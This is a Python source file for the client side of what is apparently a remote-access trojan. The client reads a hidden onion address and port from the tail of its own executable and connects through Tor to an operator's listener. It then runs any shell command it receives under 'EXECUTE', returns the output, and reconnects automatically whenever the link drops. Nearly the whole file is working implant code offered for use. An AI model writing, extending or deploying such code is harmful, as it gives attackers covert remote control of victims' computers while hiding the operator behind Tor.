from network import ClientSocket, Tor
import tasks
import sys
import os
import socket


def read_address_from_binary():
    # read onion and port from end of file
    path = os.path.abspath(sys.executable)
    with open(path, 'rb') as f:
        data = f.read()
        onion = data[-67:-5].decode()
        port = int(data[-5:].decode())
    return onion, port


class Client:
    BUFFER_SIZE = 4096

    def __init__(self):
        self.__tor = Tor()
        self.__sock = None
        self.initialize_network()

    def initialize_network(self):
        onion, port = read_address_from_binary()
        self.__sock = ClientSocket(onion, port)
        # start shell after successful network connection
        self.run()

    def run(self):
        """
        Once the connection is established the client receives tasks,
        and responds with the corresponding output.
        """
        while True:
            # receive task
            try:
                task, args = self.__sock.receive(self.BUFFER_SIZE)
                # evaluate output
                execution_status = self.execute(task, args)
            # broken connection because either network.send or network.receive raised an exception.
            except socket.error:
                del self.__sock
                break
            if execution_status == -1:
                continue
            elif execution_status == 0:
                pass

        # re-establish connection after it is broken
        self.initialize_network()

    def execute(self, task, args) -> int:
        """
        Executes the input of the listener.
        """
        if task == 'EXECUTE':
            command = args[0]
            output = tasks.execute_shell(command)
            self.__sock.send(output)
        elif task == 'ACTIVE':
            self.__sock.send('ACTIVE')
        elif task == '':
            # no empty string gets send because the client sends back the cwd everytime anyways.
            self.__sock.send('')
        elif task == 'EXIT':
            return -1
        else:
            self.__sock.send('Unknown command')
        return 0


if __name__ == '__main__':
    client = Client()
